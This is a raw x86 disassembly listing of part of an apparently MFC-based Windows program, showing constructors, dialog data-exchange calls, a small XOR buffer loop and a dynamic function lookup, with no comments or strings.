  402b5e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  402b65:	51                   	push   %ecx
  402b66:	56                   	push   %esi
  402b67:	8b f1                	mov    %ecx,%esi
  402b69:	89 74 24 04          	mov    %esi,0x4(%esp)
  402b6d:	8b 86 bc 00 00 00    	mov    0xbc(%esi),%eax
  402b73:	c7 44 24 10 07 00 00 	movl   $0x7,0x10(%esp)
  402b7a:	00 
  402b7b:	85 c0                	test   %eax,%eax
  402b7d:	74 06                	je     0x402b85
  402b7f:	8b 08                	mov    (%eax),%ecx
  402b81:	50                   	push   %eax
  402b82:	ff 51 08             	call   *0x8(%ecx)
  402b85:	8d 8e b4 00 00 00    	lea    0xb4(%esi),%ecx
  402b8b:	c6 44 24 10 06       	movb   $0x6,0x10(%esp)
  402b90:	e8 6f 1a 00 00       	call   0x404604
  402b95:	8d 8e b0 00 00 00    	lea    0xb0(%esi),%ecx
  402b9b:	c6 44 24 10 05       	movb   $0x5,0x10(%esp)
  402ba0:	e8 5f 1a 00 00       	call   0x404604
  402ba5:	8d 8e ac 00 00 00    	lea    0xac(%esi),%ecx
  402bab:	c6 44 24 10 04       	movb   $0x4,0x10(%esp)
  402bb0:	e8 4f 1a 00 00       	call   0x404604
  402bb5:	8d 8e a8 00 00 00    	lea    0xa8(%esi),%ecx
  402bbb:	c6 44 24 10 03       	movb   $0x3,0x10(%esp)
  402bc0:	e8 3f 1a 00 00       	call   0x404604
  402bc5:	8d 8e a4 00 00 00    	lea    0xa4(%esi),%ecx
  402bcb:	c6 44 24 10 02       	movb   $0x2,0x10(%esp)
  402bd0:	e8 2f 1a 00 00       	call   0x404604
  402bd5:	8d 8e a0 00 00 00    	lea    0xa0(%esi),%ecx
  402bdb:	c6 44 24 10 01       	movb   $0x1,0x10(%esp)
  402be0:	e8 1f 1a 00 00       	call   0x404604
  402be5:	8d 4e 60             	lea    0x60(%esi),%ecx
  402be8:	c6 44 24 10 00       	movb   $0x0,0x10(%esp)
  402bed:	e8 a2 1a 00 00       	call   0x404694
  402bf2:	8b ce                	mov    %esi,%ecx
  402bf4:	c7 44 24 10 ff ff ff 	movl   $0xffffffff,0x10(%esp)
  402bfb:	ff 
  402bfc:	e8 09 1a 00 00       	call   0x40460a
  402c01:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  402c05:	5e                   	pop    %esi
  402c06:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402c0d:	83 c4 10             	add    $0x10,%esp
  402c10:	c3                   	ret
  402c11:	90                   	nop
  402c12:	90                   	nop
  402c13:	90                   	nop
  402c14:	90                   	nop
  402c15:	90                   	nop
  402c16:	90                   	nop
  402c17:	90                   	nop
  402c18:	90                   	nop
  402c19:	90                   	nop
  402c1a:	90                   	nop
  402c1b:	90                   	nop
  402c1c:	90                   	nop
  402c1d:	90                   	nop
  402c1e:	90                   	nop
  402c1f:	90                   	nop
  402c20:	56                   	push   %esi
  402c21:	8b f1                	mov    %ecx,%esi
  402c23:	57                   	push   %edi
  402c24:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  402c28:	8d 46 60             	lea    0x60(%esi),%eax
  402c2b:	50                   	push   %eax
  402c2c:	68 24 04 00 00       	push   $0x424
  402c31:	57                   	push   %edi
  402c32:	e8 75 1a 00 00       	call   0x4046ac
  402c37:	8d 8e a0 00 00 00    	lea    0xa0(%esi),%ecx
  402c3d:	51                   	push   %ecx
  402c3e:	68 22 04 00 00       	push   $0x422
  402c43:	57                   	push   %edi
  402c44:	e8 bd 1a 00 00       	call   0x404706
  402c49:	8d 96 a4 00 00 00    	lea    0xa4(%esi),%edx
  402c4f:	52                   	push   %edx
  402c50:	68 23 04 00 00       	push   $0x423
  402c55:	57                   	push   %edi
  402c56:	e8 d9 19 00 00       	call   0x404634
  402c5b:	8d 86 a8 00 00 00    	lea    0xa8(%esi),%eax
  402c61:	50                   	push   %eax
  402c62:	68 2b 04 00 00       	push   $0x42b
  402c67:	57                   	push   %edi
  402c68:	e8 c7 19 00 00       	call   0x404634
  402c6d:	8d 8e ac 00 00 00    	lea    0xac(%esi),%ecx
  402c73:	51                   	push   %ecx
  402c74:	68 29 04 00 00       	push   $0x429
  402c79:	57                   	push   %edi
  402c7a:	e8 b5 19 00 00       	call   0x404634
  402c7f:	8d 96 b0 00 00 00    	lea    0xb0(%esi),%edx
  402c85:	52                   	push   %edx
  402c86:	68 28 04 00 00       	push   $0x428
  402c8b:	57                   	push   %edi
  402c8c:	e8 a3 19 00 00       	call   0x404634
  402c91:	8d 86 b4 00 00 00    	lea    0xb4(%esi),%eax
  402c97:	50                   	push   %eax
  402c98:	68 2c 04 00 00       	push   $0x42c
  402c9d:	57                   	push   %edi
  402c9e:	e8 91 19 00 00       	call   0x404634
  402ca3:	81 c6 b8 00 00 00    	add    $0xb8,%esi
  402ca9:	56                   	push   %esi
  402caa:	68 2a 04 00 00       	push   $0x42a
  402caf:	57                   	push   %edi
  402cb0:	e8 79 19 00 00       	call   0x40462e
  402cb5:	68 00 00 16 43       	push   $0x43160000
  402cba:	68 00 00 80 3f       	push   $0x3f800000
  402cbf:	56                   	push   %esi
  402cc0:	57                   	push   %edi
  402cc1:	e8 62 19 00 00       	call   0x404628
  402cc6:	5f                   	pop    %edi
  402cc7:	5e                   	pop    %esi
  402cc8:	c2 04 00             	ret    $0x4
  402ccb:	90                   	nop
  402ccc:	90                   	nop
  402ccd:	90                   	nop
  402cce:	90                   	nop
  402ccf:	90                   	nop
  402cd0:	b8 60 6c 40 00       	mov    $0x406c60,%eax
  402cd5:	c3                   	ret
  402cd6:	90                   	nop
  402cd7:	90                   	nop
  402cd8:	90                   	nop
  402cd9:	90                   	nop
  402cda:	90                   	nop
  402cdb:	90                   	nop
  402cdc:	90                   	nop
  402cdd:	90                   	nop
  402cde:	90                   	nop
  402cdf:	90                   	nop
  402ce0:	c3                   	ret
  402ce1:	90                   	nop
  402ce2:	90                   	nop
  402ce3:	90                   	nop
  402ce4:	90                   	nop
  402ce5:	90                   	nop
  402ce6:	90                   	nop
  402ce7:	90                   	nop
  402ce8:	90                   	nop
  402ce9:	90                   	nop
  402cea:	90                   	nop
  402ceb:	90                   	nop
  402cec:	90                   	nop
  402ced:	90                   	nop
  402cee:	90                   	nop
  402cef:	90                   	nop
  402cf0:	6a ff                	push   $0xffffffff
  402cf2:	68 60 51 40 00       	push   $0x405160
  402cf7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402cfd:	50                   	push   %eax
  402cfe:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  402d05:	83 ec 08             	sub    $0x8,%esp
  402d08:	53                   	push   %ebx
  402d09:	55                   	push   %ebp
  402d0a:	56                   	push   %esi
  402d0b:	8b f1                	mov    %ecx,%esi
  402d0d:	57                   	push   %edi
  402d0e:	6a 00                	push   $0x0
  402d10:	8b 86 80 00 00 00    	mov    0x80(%esi),%eax
  402d16:	6a 00                	push   $0x0
  402d18:	68 42 10 00 00       	push   $0x1042
  402d1d:	50                   	push   %eax
  402d1e:	ff 15 34 63 40 00    	call   *0x406334
  402d24:	8b f8                	mov    %eax,%edi
  402d26:	6a 00                	push   $0x0
  402d28:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  402d2c:	8d 5e 60             	lea    0x60(%esi),%ebx
  402d2f:	57                   	push   %edi
  402d30:	51                   	push   %ecx
  402d31:	8b cb                	mov    %ebx,%ecx
  402d33:	e8 8c 19 00 00       	call   0x4046c4
  402d38:	50                   	push   %eax
  402d39:	8d 8e b0 00 00 00    	lea    0xb0(%esi),%ecx
  402d3f:	c7 44 24 24 00 00 00 	movl   $0x0,0x24(%esp)
  402d46:	00 
  402d47:	e8 72 19 00 00       	call   0x4046be
  402d4c:	83 cd ff             	or     $0xffffffff,%ebp
  402d4f:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  402d53:	89 6c 24 20          	mov    %ebp,0x20(%esp)
  402d57:	e8 a8 18 00 00       	call   0x404604
  402d5c:	6a 01                	push   $0x1
  402d5e:	8d 54 24 14          	lea    0x14(%esp),%edx
  402d62:	57                   	push   %edi
  402d63:	52                   	push   %edx
  402d64:	8b cb                	mov    %ebx,%ecx
  402d66:	e8 59 19 00 00       	call   0x4046c4
  402d6b:	50                   	push   %eax
  402d6c:	8d 8e ac 00 00 00    	lea    0xac(%esi),%ecx
  402d72:	c7 44 24 24 01 00 00 	movl   $0x1,0x24(%esp)
  402d79:	00 
  402d7a:	e8 3f 19 00 00       	call   0x4046be
  402d7f:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  402d83:	89 6c 24 20          	mov    %ebp,0x20(%esp)
  402d87:	e8 78 18 00 00       	call   0x404604
  402d8c:	6a 02                	push   $0x2
  402d8e:	8d 44 24 14          	lea    0x14(%esp),%eax
  402d92:	57                   	push   %edi
  402d93:	50                   	push   %eax
  402d94:	8b cb                	mov    %ebx,%ecx
  402d96:	e8 29 19 00 00       	call   0x4046c4
  402d9b:	50                   	push   %eax
  402d9c:	8d 8e a0 00 00 00    	lea    0xa0(%esi),%ecx
  402da2:	c7 44 24 24 02 00 00 	movl   $0x2,0x24(%esp)
  402da9:	00 
  402daa:	e8 0f 19 00 00       	call   0x4046be
  402daf:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  402db3:	89 6c 24 20          	mov    %ebp,0x20(%esp)
  402db7:	e8 48 18 00 00       	call   0x404604
  402dbc:	6a 03                	push   $0x3
  402dbe:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  402dc2:	57                   	push   %edi
  402dc3:	51                   	push   %ecx
  402dc4:	8b cb                	mov    %ebx,%ecx
  402dc6:	e8 f9 18 00 00       	call   0x4046c4
  402dcb:	8b 00                	mov    (%eax),%eax
  402dcd:	50                   	push   %eax
  402dce:	ff 15 d0 62 40 00    	call   *0x4062d0
  402dd4:	d9 9e b8 00 00 00    	fstps  0xb8(%esi)
  402dda:	83 c4 04             	add    $0x4,%esp
  402ddd:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  402de1:	e8 1e 18 00 00       	call   0x404604
  402de6:	6a 04                	push   $0x4
  402de8:	8d 54 24 14          	lea    0x14(%esp),%edx
  402dec:	57                   	push   %edi
  402ded:	52                   	push   %edx
  402dee:	8b cb                	mov    %ebx,%ecx
  402df0:	e8 cf 18 00 00       	call   0x4046c4
  402df5:	50                   	push   %eax
  402df6:	8d 8e a8 00 00 00    	lea    0xa8(%esi),%ecx
  402dfc:	c7 44 24 24 03 00 00 	movl   $0x3,0x24(%esp)
  402e03:	00 
  402e04:	e8 b5 18 00 00       	call   0x4046be
  402e09:	89 6c 24 20          	mov    %ebp,0x20(%esp)
  402e0d:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  402e11:	e8 ee 17 00 00       	call   0x404604
  402e16:	6a 05                	push   $0x5
  402e18:	8d 44 24 14          	lea    0x14(%esp),%eax
  402e1c:	57                   	push   %edi
  402e1d:	50                   	push   %eax
  402e1e:	8b cb                	mov    %ebx,%ecx
  402e20:	e8 9f 18 00 00       	call   0x4046c4
  402e25:	50                   	push   %eax
  402e26:	8d 8e b4 00 00 00    	lea    0xb4(%esi),%ecx
  402e2c:	c7 44 24 24 04 00 00 	movl   $0x4,0x24(%esp)
  402e33:	00 
  402e34:	e8 85 18 00 00       	call   0x4046be
  402e39:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  402e3d:	89 6c 24 20          	mov    %ebp,0x20(%esp)
  402e41:	e8 be 17 00 00       	call   0x404604
  402e46:	6a 06                	push   $0x6
  402e48:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  402e4c:	57                   	push   %edi
  402e4d:	51                   	push   %ecx
  402e4e:	8b cb                	mov    %ebx,%ecx
  402e50:	e8 6f 18 00 00       	call   0x4046c4
  402e55:	50                   	push   %eax
  402e56:	8d 8e a4 00 00 00    	lea    0xa4(%esi),%ecx
  402e5c:	c7 44 24 24 05 00 00 	movl   $0x5,0x24(%esp)
  402e63:	00 
  402e64:	e8 55 18 00 00       	call   0x4046be
  402e69:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  402e6d:	89 6c 24 20          	mov    %ebp,0x20(%esp)
  402e71:	e8 8e 17 00 00       	call   0x404604
  402e76:	6a 00                	push   $0x0
  402e78:	8b ce                	mov    %esi,%ecx
  402e7a:	e8 33 18 00 00       	call   0x4046b2
  402e7f:	8b 54 24 2c          	mov    0x2c(%esp),%edx
  402e83:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  402e87:	5f                   	pop    %edi
  402e88:	5e                   	pop    %esi
  402e89:	c7 02 00 00 00 00    	movl   $0x0,(%edx)
  402e8f:	5d                   	pop    %ebp
  402e90:	5b                   	pop    %ebx
  402e91:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402e98:	83 c4 14             	add    $0x14,%esp
  402e9b:	c2 08 00             	ret    $0x8
  402e9e:	90                   	nop
  402e9f:	90                   	nop
  402ea0:	8b 44 24 04          	mov    0x4(%esp),%eax
  402ea4:	56                   	push   %esi
  402ea5:	50                   	push   %eax
  402ea6:	8b f1                	mov    %ecx,%esi
  402ea8:	68 81 00 00 00       	push   $0x81
  402ead:	e8 6a 17 00 00       	call   0x40461c
  402eb2:	c7 06 d8 6d 40 00    	movl   $0x406dd8,(%esi)
  402eb8:	8b c6                	mov    %esi,%eax
  402eba:	5e                   	pop    %esi
  402ebb:	c2 04 00             	ret    $0x4
  402ebe:	90                   	nop
  402ebf:	90                   	nop
  402ec0:	c2 04 00             	ret    $0x4
  402ec3:	90                   	nop
  402ec4:	90                   	nop
  402ec5:	90                   	nop
  402ec6:	90                   	nop
  402ec7:	90                   	nop
  402ec8:	90                   	nop
  402ec9:	90                   	nop
  402eca:	90                   	nop
  402ecb:	90                   	nop
  402ecc:	90                   	nop
  402ecd:	90                   	nop
  402ece:	90                   	nop
  402ecf:	90                   	nop
  402ed0:	b8 b8 6d 40 00       	mov    $0x406db8,%eax
  402ed5:	c3                   	ret
  402ed6:	90                   	nop
  402ed7:	90                   	nop
  402ed8:	90                   	nop
  402ed9:	90                   	nop
  402eda:	90                   	nop
  402edb:	90                   	nop
  402edc:	90                   	nop
  402edd:	90                   	nop
  402ede:	90                   	nop
  402edf:	90                   	nop
  402ee0:	a1 64 61 40 00       	mov    0x406164,%eax
  402ee5:	c3                   	ret
  402ee6:	90                   	nop
  402ee7:	90                   	nop
  402ee8:	90                   	nop
  402ee9:	90                   	nop
  402eea:	90                   	nop
  402eeb:	90                   	nop
  402eec:	90                   	nop
  402eed:	90                   	nop
  402eee:	90                   	nop
  402eef:	90                   	nop
  402ef0:	b8 b0 6e 40 00       	mov    $0x406eb0,%eax
  402ef5:	c3                   	ret
  402ef6:	90                   	nop
  402ef7:	90                   	nop
  402ef8:	90                   	nop
  402ef9:	90                   	nop
  402efa:	90                   	nop
  402efb:	90                   	nop
  402efc:	90                   	nop
  402efd:	90                   	nop
  402efe:	90                   	nop
  402eff:	90                   	nop
  402f00:	56                   	push   %esi
  402f01:	8b f1                	mov    %ecx,%esi
  402f03:	6a 00                	push   $0x0
  402f05:	e8 7a 18 00 00       	call   0x404784
  402f0a:	c7 06 e8 6e 40 00    	movl   $0x406ee8,(%esi)
  402f10:	8b c6                	mov    %esi,%eax
  402f12:	5e                   	pop    %esi
  402f13:	c3                   	ret
  402f14:	90                   	nop
  402f15:	90                   	nop
  402f16:	90                   	nop
  402f17:	90                   	nop
  402f18:	90                   	nop
  402f19:	90                   	nop
  402f1a:	90                   	nop
  402f1b:	90                   	nop
  402f1c:	90                   	nop
  402f1d:	90                   	nop
  402f1e:	90                   	nop
  402f1f:	90                   	nop
  402f20:	56                   	push   %esi
  402f21:	8b f1                	mov    %ecx,%esi
  402f23:	e8 18 00 00 00       	call   0x402f40
  402f28:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  402f2d:	74 09                	je     0x402f38
  402f2f:	56                   	push   %esi
  402f30:	e8 ed 16 00 00       	call   0x404622
  402f35:	83 c4 04             	add    $0x4,%esp
  402f38:	8b c6                	mov    %esi,%eax
  402f3a:	5e                   	pop    %esi
  402f3b:	c2 04 00             	ret    $0x4
  402f3e:	90                   	nop
  402f3f:	90                   	nop
  402f40:	e9 45 18 00 00       	jmp    0x40478a
  402f45:	90                   	nop
  402f46:	90                   	nop
  402f47:	90                   	nop
  402f48:	90                   	nop
  402f49:	90                   	nop
  402f4a:	90                   	nop
  402f4b:	90                   	nop
  402f4c:	90                   	nop
  402f4d:	90                   	nop
  402f4e:	90                   	nop
  402f4f:	90                   	nop
  402f50:	e8 0b 00 00 00       	call   0x402f60
  402f55:	e9 16 00 00 00       	jmp    0x402f70
  402f5a:	90                   	nop
  402f5b:	90                   	nop
  402f5c:	90                   	nop
  402f5d:	90                   	nop
  402f5e:	90                   	nop
  402f5f:	90                   	nop
  402f60:	b9 28 44 45 00       	mov    $0x454428,%ecx
  402f65:	e9 96 ff ff ff       	jmp    0x402f00
  402f6a:	90                   	nop
  402f6b:	90                   	nop
  402f6c:	90                   	nop
  402f6d:	90                   	nop
  402f6e:	90                   	nop
  402f6f:	90                   	nop
  402f70:	68 80 2f 40 00       	push   $0x402f80
  402f75:	e8 e2 18 00 00       	call   0x40485c
  402f7a:	59                   	pop    %ecx
  402f7b:	c3                   	ret
  402f7c:	90                   	nop
  402f7d:	90                   	nop
  402f7e:	90                   	nop
  402f7f:	90                   	nop
  402f80:	b9 28 44 45 00       	mov    $0x454428,%ecx
  402f85:	e9 b6 ff ff ff       	jmp    0x402f40
  402f8a:	90                   	nop
  402f8b:	90                   	nop
  402f8c:	90                   	nop
  402f8d:	90                   	nop
  402f8e:	90                   	nop
  402f8f:	90                   	nop
  402f90:	6a ff                	push   $0xffffffff
  402f92:	68 78 51 40 00       	push   $0x405178
  402f97:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402f9d:	50                   	push   %eax
  402f9e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  402fa5:	83 ec 6c             	sub    $0x6c,%esp
  402fa8:	56                   	push   %esi
  402fa9:	8b f1                	mov    %ecx,%esi
  402fab:	6a 00                	push   $0x0
  402fad:	e8 fc 17 00 00       	call   0x4047ae
  402fb2:	83 c4 04             	add    $0x4,%esp
  402fb5:	8b ce                	mov    %esi,%ecx
  402fb7:	e8 ec 17 00 00       	call   0x4047a8
  402fbc:	6a 00                	push   $0x0
  402fbe:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  402fc2:	e8 e9 00 00 00       	call   0x4030b0
  402fc7:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  402fcb:	c7 44 24 78 00 00 00 	movl   $0x0,0x78(%esp)
  402fd2:	00 
  402fd3:	e8 68 04 00 00       	call   0x403440
  402fd8:	8b ce                	mov    %esi,%ecx
  402fda:	e8 c3 17 00 00       	call   0x4047a2
  402fdf:	85 c0                	test   %eax,%eax
  402fe1:	75 14                	jne    0x402ff7
  402fe3:	8b ce                	mov    %esi,%ecx
  402fe5:	e8 b2 17 00 00       	call   0x40479c
  402fea:	85 c0                	test   %eax,%eax
  402fec:	75 09                	jne    0x402ff7
  402fee:	6a 01                	push   $0x1
  402ff0:	e8 a1 17 00 00       	call   0x404796
  402ff5:	eb 05                	jmp    0x402ffc
  402ff7:	e8 94 17 00 00       	call   0x404790
  402ffc:	8d 44 24 04          	lea    0x4(%esp),%eax
  403000:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  403004:	89 46 20             	mov    %eax,0x20(%esi)
  403007:	e8 02 15 00 00       	call   0x40450e
  40300c:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  403010:	c7 44 24 78 ff ff ff 	movl   $0xffffffff,0x78(%esp)
  403017:	ff 
  403018:	e8 33 01 00 00       	call   0x403150
  40301d:	8b 4c 24 70          	mov    0x70(%esp),%ecx
  403021:	33 c0                	xor    %eax,%eax
  403023:	5e                   	pop    %esi
  403024:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40302b:	83 c4 78             	add    $0x78,%esp
  40302e:	c3                   	ret
  40302f:	90                   	nop
  403030:	56                   	push   %esi
  403031:	6a 00                	push   $0x0
  403033:	8b f1                	mov    %ecx,%esi
  403035:	6a 64                	push   $0x64
  403037:	e8 e0 15 00 00       	call   0x40461c
  40303c:	c7 06 38 71 40 00    	movl   $0x407138,(%esi)
  403042:	8b c6                	mov    %esi,%eax
  403044:	5e                   	pop    %esi
  403045:	c3                   	ret
  403046:	90                   	nop
  403047:	90                   	nop
  403048:	90                   	nop
  403049:	90                   	nop
  40304a:	90                   	nop
  40304b:	90                   	nop
  40304c:	90                   	nop
  40304d:	90                   	nop
  40304e:	90                   	nop
  40304f:	90                   	nop
  403050:	56                   	push   %esi
  403051:	8b f1                	mov    %ecx,%esi
  403053:	e8 18 00 00 00       	call   0x403070
  403058:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40305d:	74 09                	je     0x403068
  40305f:	56                   	push   %esi
  403060:	e8 bd 15 00 00       	call   0x404622
  403065:	83 c4 04             	add    $0x4,%esp
  403068:	8b c6                	mov    %esi,%eax
  40306a:	5e                   	pop    %esi
  40306b:	c2 04 00             	ret    $0x4
  40306e:	90                   	nop
  40306f:	90                   	nop
  403070:	e9 95 15 00 00       	jmp    0x40460a
  403075:	90                   	nop
  403076:	90                   	nop
  403077:	90                   	nop
  403078:	90                   	nop
  403079:	90                   	nop
  40307a:	90                   	nop
  40307b:	90                   	nop
  40307c:	90                   	nop
  40307d:	90                   	nop
  40307e:	90                   	nop
  40307f:	90                   	nop
  403080:	b8 90 6f 40 00       	mov    $0x406f90,%eax
  403085:	c3                   	ret
  403086:	90                   	nop
  403087:	90                   	nop
  403088:	90                   	nop
  403089:	90                   	nop
  40308a:	90                   	nop
  40308b:	90                   	nop
  40308c:	90                   	nop
  40308d:	90                   	nop
  40308e:	90                   	nop
  40308f:	90                   	nop
  403090:	a1 d4 61 40 00       	mov    0x4061d4,%eax
  403095:	c3                   	ret
  403096:	90                   	nop
  403097:	90                   	nop
  403098:	90                   	nop
  403099:	90                   	nop
  40309a:	90                   	nop
  40309b:	90                   	nop
  40309c:	90                   	nop
  40309d:	90                   	nop
  40309e:	90                   	nop
  40309f:	90                   	nop
  4030a0:	b8 b0 6f 40 00       	mov    $0x406fb0,%eax
  4030a5:	c3                   	ret
  4030a6:	90                   	nop
  4030a7:	90                   	nop
  4030a8:	90                   	nop
  4030a9:	90                   	nop
  4030aa:	90                   	nop
  4030ab:	90                   	nop
  4030ac:	90                   	nop
  4030ad:	90                   	nop
  4030ae:	90                   	nop
  4030af:	90                   	nop
  4030b0:	6a ff                	push   $0xffffffff
  4030b2:	68 a3 51 40 00       	push   $0x4051a3
  4030b7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4030bd:	50                   	push   %eax
  4030be:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4030c5:	51                   	push   %ecx
  4030c6:	8b 44 24 14          	mov    0x14(%esp),%eax
  4030ca:	56                   	push   %esi
  4030cb:	8b f1                	mov    %ecx,%esi
  4030cd:	50                   	push   %eax
  4030ce:	6a 66                	push   $0x66
  4030d0:	89 74 24 0c          	mov    %esi,0xc(%esp)
  4030d4:	e8 43 15 00 00       	call   0x40461c
  4030d9:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  4030e0:	00 
  4030e1:	c7 46 68 00 00 00 00 	movl   $0x0,0x68(%esi)
  4030e8:	c6 44 24 10 01       	movb   $0x1,0x10(%esp)
  4030ed:	c7 06 10 72 40 00    	movl   $0x407210,(%esi)
  4030f3:	e8 c2 16 00 00       	call   0x4047ba
  4030f8:	68 80 00 00 00       	push   $0x80
  4030fd:	6a 0e                	push   $0xe
  4030ff:	68 80 00 00 00       	push   $0x80
  403104:	e8 ab 16 00 00       	call   0x4047b4
  403109:	50                   	push   %eax
  40310a:	ff 15 2c 63 40 00    	call   *0x40632c
  403110:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  403114:	89 46 64             	mov    %eax,0x64(%esi)
  403117:	c7 46 60 00 00 00 00 	movl   $0x0,0x60(%esi)
  40311e:	8b c6                	mov    %esi,%eax
  403120:	5e                   	pop    %esi
  403121:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403128:	83 c4 10             	add    $0x10,%esp
  40312b:	c2 04 00             	ret    $0x4
  40312e:	90                   	nop
  40312f:	90                   	nop
  403130:	56                   	push   %esi
  403131:	8b f1                	mov    %ecx,%esi
  403133:	e8 18 00 00 00       	call   0x403150
  403138:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40313d:	74 09                	je     0x403148
  40313f:	56                   	push   %esi
  403140:	e8 dd 14 00 00       	call   0x404622
  403145:	83 c4 04             	add    $0x4,%esp
  403148:	8b c6                	mov    %esi,%eax
  40314a:	5e                   	pop    %esi
  40314b:	c2 04 00             	ret    $0x4
  40314e:	90                   	nop
  40314f:	90                   	nop
  403150:	6a ff                	push   $0xffffffff
  403152:	68 b8 51 40 00       	push   $0x4051b8
  403157:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40315d:	50                   	push   %eax
  40315e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403165:	51                   	push   %ecx
  403166:	56                   	push   %esi
  403167:	8b f1                	mov    %ecx,%esi
  403169:	89 74 24 04          	mov    %esi,0x4(%esp)
  40316d:	c7 06 10 72 40 00    	movl   $0x407210,(%esi)
  403173:	8b 46 60             	mov    0x60(%esi),%eax
  403176:	33 c9                	xor    %ecx,%ecx
  403178:	3b c1                	cmp    %ecx,%eax
  40317a:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  40317e:	74 03                	je     0x403183
  403180:	89 48 20             	mov    %ecx,0x20(%eax)
  403183:	8b 46 68             	mov    0x68(%esi),%eax
  403186:	3b c1                	cmp    %ecx,%eax
  403188:	74 06                	je     0x403190
  40318a:	8b 08                	mov    (%eax),%ecx
  40318c:	50                   	push   %eax
  40318d:	ff 51 08             	call   *0x8(%ecx)
  403190:	8b ce                	mov    %esi,%ecx
  403192:	c7 44 24 10 ff ff ff 	movl   $0xffffffff,0x10(%esp)
  403199:	ff 
  40319a:	e8 6b 14 00 00       	call   0x40460a
  40319f:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4031a3:	5e                   	pop    %esi
  4031a4:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4031ab:	83 c4 10             	add    $0x10,%esp
  4031ae:	c3                   	ret
  4031af:	90                   	nop
  4031b0:	b8 c8 6f 40 00       	mov    $0x406fc8,%eax
  4031b5:	c3                   	ret
  4031b6:	90                   	nop
  4031b7:	90                   	nop
  4031b8:	90                   	nop
  4031b9:	90                   	nop
  4031ba:	90                   	nop
  4031bb:	90                   	nop
  4031bc:	90                   	nop
  4031bd:	90                   	nop
  4031be:	90                   	nop
  4031bf:	90                   	nop
  4031c0:	8b 44 24 08          	mov    0x8(%esp),%eax
  4031c4:	56                   	push   %esi
  4031c5:	57                   	push   %edi
  4031c6:	33 f6                	xor    %esi,%esi
  4031c8:	33 ff                	xor    %edi,%edi
  4031ca:	85 c0                	test   %eax,%eax
  4031cc:	7e 37                	jle    0x403205
  4031ce:	53                   	push   %ebx
  4031cf:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  4031d3:	55                   	push   %ebp
  4031d4:	8b 6c 24 1c          	mov    0x1c(%esp),%ebp
  4031d8:	e8 83 12 00 00       	call   0x404460
  4031dd:	8a 44 2f 01          	mov    0x1(%edi,%ebp,1),%al
  4031e1:	8a 0c 1e             	mov    (%esi,%ebx,1),%cl
  4031e4:	47                   	inc    %edi
  4031e5:	32 c8                	xor    %al,%cl
  4031e7:	8b c6                	mov    %esi,%eax
  4031e9:	88 0c 1e             	mov    %cl,(%esi,%ebx,1)
  4031ec:	99                   	cltd
  4031ed:	b9 0b 00 00 00       	mov    $0xb,%ecx
  4031f2:	f7 f9                	idiv   %ecx
  4031f4:	85 d2                	test   %edx,%edx
  4031f6:	75 02                	jne    0x4031fa
  4031f8:	33 ff                	xor    %edi,%edi
  4031fa:	8b 44 24 18          	mov    0x18(%esp),%eax
  4031fe:	46                   	inc    %esi
  4031ff:	3b f0                	cmp    %eax,%esi
  403201:	7c d5                	jl     0x4031d8
  403203:	5d                   	pop    %ebp
  403204:	5b                   	pop    %ebx
  403205:	5f                   	pop    %edi
  403206:	5e                   	pop    %esi
  403207:	c3                   	ret
  403208:	90                   	nop
  403209:	90                   	nop
  40320a:	90                   	nop
  40320b:	90                   	nop
  40320c:	90                   	nop
  40320d:	90                   	nop
  40320e:	90                   	nop
  40320f:	90                   	nop
  403210:	e9 0b 00 00 00       	jmp    0x403220
  403215:	90                   	nop
  403216:	90                   	nop
  403217:	90                   	nop
  403218:	90                   	nop
  403219:	90                   	nop
  40321a:	90                   	nop
  40321b:	90                   	nop
  40321c:	90                   	nop
  40321d:	90                   	nop
  40321e:	90                   	nop
  40321f:	90                   	nop
  403220:	68 a4 90 40 00       	push   $0x4090a4
  403225:	68 94 90 40 00       	push   $0x409094
  40322a:	ff 15 04 60 40 00    	call   *0x406004
  403230:	50                   	push   %eax
  403231:	ff 15 00 60 40 00    	call   *0x406000
  403237:	a3 00 45 45 00       	mov    %eax,0x454500
  40323c:	c3                   	ret
  40323d:	90                   	nop
  40323e:	90                   	nop
  40323f:	90                   	nop
  403240:	55                   	push   %ebp
  403241:	8b ec                	mov    %esp,%ebp
  403243:	6a ff                	push   $0xffffffff
  403245:	68 d0 51 40 00       	push   $0x4051d0
  40324a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403250:	50                   	push   %eax
  403251:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
